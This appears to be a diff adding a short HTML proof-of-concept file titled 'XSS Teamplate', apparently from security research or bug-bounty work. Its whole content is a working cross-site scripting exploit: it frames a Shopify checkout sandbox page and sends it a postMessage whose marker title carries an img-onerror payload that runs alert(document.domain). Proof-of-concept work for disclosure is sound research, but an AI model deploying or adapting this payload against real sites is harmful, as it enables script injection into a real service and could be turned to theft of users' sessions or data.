@@ -1,0 +1,24 @@
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>XSS Teamplate</title>
+</head>
+<body>
+<script>
+    
+    var frame = document.createElement("iframe");
+    frame.src = "https://checkout.shopify.com/4736483384/sandbox/google_maps";
+    frame.onload = function() {
+    frame.contentWindow.postMessage("shopify_google_api:" + JSON.stringify({
+        action: "createMapAndMarkers", 
+        body: [{
+        title: "<img src=xx: onerror=alert(document.domain)>"
+        }]
+    }), "*");
+    }
+    document.body.appendChild(frame);
+
+</script>
+
+</body>
+</html>
